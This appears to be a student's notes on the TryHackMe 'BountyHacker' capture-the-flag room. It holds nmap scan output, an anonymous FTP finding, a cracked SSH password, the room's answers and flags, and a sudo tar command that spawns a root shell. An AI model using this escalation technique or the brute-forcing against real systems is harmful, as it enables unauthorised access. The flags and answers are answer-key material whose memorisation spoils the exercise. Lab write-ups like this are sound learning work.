TryHackMe.com

box = BountyHacker

export IP=10.10.110.187

# NMAP SCANS

```

Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-21 11:55 GMT
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.55% done
Nmap scan report for ip-10-10-110-187.eu-west-1.compute.internal (10.10.110.187)
Host is up (0.00042s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.203.215
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:80:9B:0D:AD:9F (Unknown)
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (89%), Linux 2.6.32 - 3.1 (89%), Ubiquiti AirOS 5.5.9 (89%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.0 - 3.2 (89%), Linux 3.8 (88%), Infomir MAG-250 set-top box (88%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms ip-10-10-110-187.eu-west-1.compute.internal (10.10.110.187)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.92 seconds

```

# USERNAMES AND PASSWORDS

- lin:RedDr4gonSynd1cat3

# INTERESTING FINDS

- anonymous login allowed in ftp server(files inside: locks.txt, task.txt)

# TASKS

* Who wrote the task list?
- lin
* Service that can be bruteforced in the machine.
- ssh
* User's password?
- RedDr4gonSynd1cat3 
* user.txt?
- THM{CR1M3_SyNd1C4T3}
* root.txt?
- THM{80UN7Y_h4cK3r}

# PRIVILEGE ESCALATION METHOD

* by using sudo -l and entering the user's password, we can see that /bin/tar can be run as root.
* using gtfobins(https://gtfobins.github.io/gtfobins/tar/) command: `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` we can be root.